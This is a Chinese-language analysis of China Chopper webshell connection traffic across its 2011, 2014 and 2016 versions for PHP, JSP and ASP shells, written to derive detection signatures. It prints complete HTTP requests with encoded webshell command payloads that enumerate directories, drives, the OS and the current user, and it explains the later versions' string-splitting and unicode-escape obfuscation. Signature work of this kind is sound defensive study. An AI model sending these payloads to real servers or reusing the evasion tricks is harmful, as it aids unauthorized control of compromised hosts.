中国菜刀自诞生以来已经历了多个版本的更新，其功能、隐秘性也随着更新得到很大提升。菜刀现在主流有三个版本在使用，分别为2011版、2014版、2016版，这三个版本中从2011版本到2014版本是功能性上进行了增强，从2014版本到2016版本是在隐秘性上进行了增强，2016版本的菜刀流量加入了混淆，使其链接流量更具有混淆性。

中国菜刀基本支持PHP、JSP、ASP这三种WebShell的连接，这三种语言所对应的流量各有差异，各个版本也有不用。下面将按照不同版本不同语言组合进行分析。其中2011版和2014版菜刀流量特征基本一致，所以放在一起分析。

中国菜刀2011版本及2014版本各语言WebShell链接流量特征

(1)PHP类WebShell链接流量
POST /webshell.php HTTP/1.1
Cache-Control: no-cache
X-Forwarded-For: 40.83.114.50
Referer: http://192.168.180.226
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: 192.168.180.226
Content-Length: 685
Connection: Close

=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D
其中特征主要在body中，将body中流量进行url解码后如下：
=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==
其中特征点有如下三部分，
第一：“eval”，eval函数用于执行传递的攻击payload，这是必不可少的；
第二：(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码，以避免被检测；
第三：&z0=QGluaV9zZXQ...，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。

注：
1.有少数时候eval方法会被assert方法替代。
2.$_POST也会被$_GET、$_REQUEST替代。
3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。

(2)JSP类WebShell链接流量：
POST /muma.jsp HTTP/1.1
Cache-Control: no-cache
X-Forwarded-For: 213.225.150.214
Referer: http://192.200.41.103
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: 192.200.41.103:8090
Content-Length: 13
Connection: Close

i=A&z0=GB2312
该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A&z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=参数用来加入攻击载荷。

注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。

(3)ASP类WebShell链接流量：
POST /server.asp HTTP/1.1
Cache-Control: no-cache
X-Forwarded-For: 177.169.197.49
Referer: http://192.168.180.226
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: 192.168.180.226
Content-Length: 968
Connection: Close

caidao=Execute("Execute(""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(""""->|""""):Execute(""""On+Error+Resume+Next:""""%26bd(""""44696D20533A533D5365727665722E4D61707061746828222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F722045616368204420696E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A526573706F6E73652E5772697465285329"""")):Response.Write(""""|<-""""):Response.End"")")
其中body流量进行URL解码后
caidao=Execute("Execute(""On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):Execute(""""On Error Resume Next:""""&bd(""""44696D20533A533D5365727665722E4D61707061746828222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F722045616368204420696E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A526573706F6E73652E5772697465285329"""")):Response.Write(""""|<-""""):Response.End"")")
其中特征点有如下三部分，
第一：“Execute”，Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数；
第二：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。
第三：Response.Write和Response.End是必有的，是来完善整个操作的。
这种流量主要识别这几部分特征，在正常流量中基本没有。

注：OnError Resume Next这个特征在大部分流量中存在，极少数情况没有。

中国菜刀2016版本各语言WebShell链接流量特征
PHP类WebShell链接流量
POST /webshell.php HTTP/1.1
X-Forwarded-For: 50.182.119.137
Referer: http://192.168.180.226/
Content-Type: application/x-www-form-urlencoded
Host: 192.168.180.226
Content-Length: 673
Cache-Control: no-cache

=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOztlY2hvKCJYQFkiKTtkaWUoKTs%3D'));\");"));
其中特征主要在body中，将body中部分如下：
=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOztlY2hvKCJYQFkiKTtkaWUoKTs%3D'));\");"));
这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。

其中特征点有如下三部分，
第一：“"Ba"."SE6"."4_dEc"."OdE”，这部分是将base64解码打断使用.来连接。
第二：@ev"."al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。
第三：QGluaV9zZXQoImRpc3BsYXlf...，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。
注：1.有少数时候eval方法会被assert方法替代。

JSP类WebShell链接流量：
POST /muma.jsp HTTP/1.1
X-Forwarded-For: 89.21.63.3
Referer: http://192.200.41.103:8090/
Content-Type: application/x-www-form-urlencoded
Host: 192.200.41.103:8090
Content-Length: 20
Cache-Control: no-cache

=A&z0=GB2312&z1=&z2=
该版本JSPwebshell流量与之前版本一样，
所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A&z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=、z2=参数用来加入攻击载荷。

注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。

ASP类WebShell链接流量：
POST /server.aspx HTTP/1.1
X-Forwarded-For: 121.125.8.145
Referer: http://192.168.180.226/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Host: 192.168.180.226
Content-Length: 639
Cache-Control: no-cache

caidao=%u0052%u0065sponse%u002E%u0057rit%u0065("X@Y");var %u0065rr:%u0045xc%u0065ption;
%u0074ry%u007B%u0065val(Syst%u0065m%u002ET%u0065xt%u002E%u0045ncoding%u002EG%u0065t%u0045ncoding(936)%u002EG%u0065tString(Syst%u0065m.Conv%u0065rt%u002EFromBas%u006564String("dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi8iKSsiXHQiKTtmb3IodmFyIGk9MDtpPD1jLmxlbmd0aC0xO2krKylSZXNwb25zZS5Xcml0ZShjW2ldWzBdKyI6Iik7")),"unsaf%u0065");
%u007Dcatch(err)%u007B%u0052esponse%u002E%u0057rite("ER"%2B"ROR:// "%2Berr.message);%u007D%u0052%u0065sponse.%u0057rit%u0065("X@Y");%u0052espons%u0065.%u0045nd();
其中body流量为：
caidao=%u0052%u0065sponse%u002E%u0057rit%u0065("X@Y");var %u0065rr:%u0045xc%u0065ption;
%u0074ry%u007B%u0065val(Syst%u0065m%u002ET%u0065xt%u002E%u0045ncoding%u002EG%u0065t%u0045ncoding(936)%u002EG%u0065tString(Syst%u0065m.Conv%u0065rt%u002EFromBas%u006564String("dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi8iKSsiXHQiKTtmb3IodmFyIGk9MDtpPD1jLmxlbmd0aC0xO2krKylSZXNwb25zZS5Xcml0ZShjW2ldWzBdKyI6Iik7")),"unsaf%u0065");
%u007Dcatch(err)%u007B%u0052esponse%u002E%u0057rite("ER"%2B"ROR:// "%2Berr.message);%u007D%u0052%u0065sponse.%u0057rit%u0065("X@Y");%u0052espons%u0065.%u0045nd();
2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。

或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。
这种流量主要识别这几部分特征，在正常流量中基本没有。
